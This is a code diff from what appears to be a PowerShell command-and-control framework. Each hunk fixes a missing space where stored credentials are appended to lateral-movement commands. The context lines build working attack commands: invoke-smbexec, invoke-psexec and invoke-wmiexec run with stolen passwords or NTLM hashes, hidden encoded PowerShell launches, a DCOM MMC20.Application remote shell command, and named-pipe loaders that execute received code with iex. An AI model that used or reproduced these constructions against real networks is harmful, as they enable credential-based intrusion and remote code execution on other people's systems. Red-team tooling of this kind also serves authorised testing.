@@ -154,9 +154,9 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         if "-credid" in params:
             creds, params = get_creds(params, startup, user)
             if creds['Password']:
-                params = params + "-domain %s -username %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                params = params + " -domain %s -username %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
             else:
-                params = params + "-domain %s -username %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
+                params = params + " -domain %s -username %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
         cmd = "invoke-smbexec %s" % params
         new_task(cmd, user, randomuri)
 
@@ -170,9 +170,9 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             if "-credid" in params:
                 creds, params = get_creds(params, startup, user)
                 if creds['Password']:
-                    params = params + "-domain %s -username %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                    params = params + " -domain %s -username %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
                 else:
-                    params = params + "-domain %s -username %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
+                    params = params + " -domain %s -username %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
             cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
             new_task(cmd, user, randomuri)
         else:
@@ -189,9 +189,9 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             if "-credid" in params:
                 creds, params = get_creds(params, startup, user)
                 if creds['Password']:
-                    params = params + "-domain %s -username %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                    params = params + " -domain %s -username %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
                 else:
-                    params = params + "-domain %s -username %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
+                    params = params + " -domain %s -username %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
             cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
             new_task(cmd, user, randomuri)
         else:
@@ -209,9 +209,9 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         if "-credid" in params:
             creds, params = get_creds(params, startup, user)
             if creds['Password']:
-                params = params + "-domain %s -username %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                params = params + " -domain %s -username %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
             else:
-                params = params + "-domain %s -username %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
+                params = params + " -domain %s -username %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
         cmd = "invoke-psexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
         new_task(cmd, user, randomuri)
 
@@ -223,9 +223,9 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         if "-credid" in params:
             creds, params = get_creds(params, startup, user)
             if creds['Password']:
-                params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                params = params + " -domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
             else:
-                params = params + "-domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
+                params = params + " -domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
         cmd = "invoke-wmiexec %s" % params
         new_task(cmd, user, randomuri)
 
@@ -297,7 +297,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             if creds is None:
                 startup(user, "Unrecognised CredID: %s" % credId)
             params = params.replace("-credid %s" % credId, "")
-            params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+            params = params + " -domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
         new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS.b64" % (PayloadsDirectory, "")), user, randomuri)
         cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
         new_task(cmd, user, randomuri)
@@ -312,9 +312,9 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             if "-credid" in params:
                 creds, params = get_creds(params, startup, user)
                 if creds['Password']:
-                    params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                    params = params + " -domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
                 else:
-                    params = params + "-domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
+                    params = params + " -domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
             cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
             new_task(cmd, user, randomuri)
         else:
@@ -331,9 +331,9 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             if "-credid" in params:
                 creds, params = get_creds(params, startup, user)
                 if creds['Password']:
-                    params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                    params = params + " -domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
                 else:
-                    params = params + "-domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
+                    params = params + " -domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
             cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
             new_task(cmd, user, randomuri)
         else:
@@ -351,9 +351,9 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         if "-credid" in params:
             creds, params = get_creds(params, startup, user)
             if creds['Password']:
-                params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                params = params + " -domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
             else:
-                params = params + "-domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
+                params = params + " -domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
         cmd = "invoke-wmiexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
         new_task(cmd, user, randomuri)
 
@@ -367,9 +367,9 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             if "-credid" in params:
                 creds, params = get_creds(params, startup, user)
                 if creds['Password']:
-                    params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                    params = params + " -domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
                 else:
-                    params = params + "-domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
+                    params = params + " -domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
             p = re.compile(r'(?<=-target.).*')
             target = re.search(p, command).group()
             pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c %s\",\"7\")" % (target, payload)
@@ -408,7 +408,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         if "-credid" in params:
             creds, params = get_creds(params, startup, user)
             if creds['Password']:
-                params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                params = params + " -domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
             else:
                 startup(user, "invoke-runas does not support hash authentication")
 
@@ -428,7 +428,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             if "-credid" in params:
                 creds, params = get_creds(params, startup, user)
                 if creds['Password']:
-                    params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                    params = params + " -domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
                 else:
                     startup(user, "invoke-runas does not support hash authentication")
             pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSDaisy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
@@ -455,7 +455,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
             if "-credid" in params:
                 creds, params = get_creds(params, startup, user)
                 if creds['Password']:
-                    params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                    params = params + " -domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
                 else:
                     startup(user, "invoke-runas does not support hash authentication")
             pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
@@ -470,7 +470,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         if "-credid" in params:
             creds, params = get_creds(params, startup, user)
             if creds['Password']:
-                params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+                params = params + " -domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
             else:
                 startup(user, "invoke-runas does not support hash authentication")
         pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
